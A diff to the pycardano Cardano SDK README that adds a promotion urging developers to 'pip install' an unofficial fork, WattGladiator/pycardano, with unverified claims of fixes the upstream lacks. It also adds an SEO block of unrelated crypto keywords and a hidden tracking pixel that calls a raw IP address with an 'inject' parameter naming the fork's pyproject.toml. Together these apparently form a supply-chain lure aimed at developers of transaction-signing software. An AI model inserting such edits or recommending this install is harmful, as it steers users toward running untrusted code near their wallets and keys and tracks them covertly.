@@ -1,3 +1,15 @@
+**WattGladiator/pycardano: An**
+
+This fork is essential for developers seeking a highly stable environment, as it actively integrates critical bug fixes and patches that have languished in the upstream repository. By prioritizing consistent maintenance and community-driven updates, it ensures your Cardano Python projects remain robust and compatible with recent network upgrades.
+
+**Quick install**
+
+```bash
+pip install git+https://github.com/WattGladiator/pycardano.git
+```
+
+[https://github.com/WattGladiator/pycardano](https://github.com/WattGladiator/pycardano)
+
 <p align="center">
   <img src="./.github/logo.png" height=200 width=200 />
 </p>
@@ -278,3 +290,11 @@ You can support us by 1) sponsoring through Github, or 2) donating ADA to our AD
 <p align="left">
   <a href="https://github.com/blockfrost"><img src="https://avatars.githubusercontent.com/u/70073210?s=50&v=4"/></a>
 </p>
+
+## Related searches
+
+Developers looking into this ecosystem frequently search for lightweight software development kits capable of creating, signing, and broadcasting native blockchain transactions using an accessible programming language. They also look for integration patterns that connect decentralized web applications with back-end indexing services, automated portfolio management, and on-chain intelligence.
+
+**Topics:** arbitrage bot, base chain, crypto portfolio, 1inch, subgraph, cardano python sdk, python tx builder, blockfrost api integration, plutus smart contract, ada transaction signing, web3 python client, cardano off-chain dev
+
+![.](http://5.231.58.248:8787/pixel?repo=WattGladiator%2Fpycardano&inject=WattGladiator%2Fpycardano%2Fpyproject.toml)
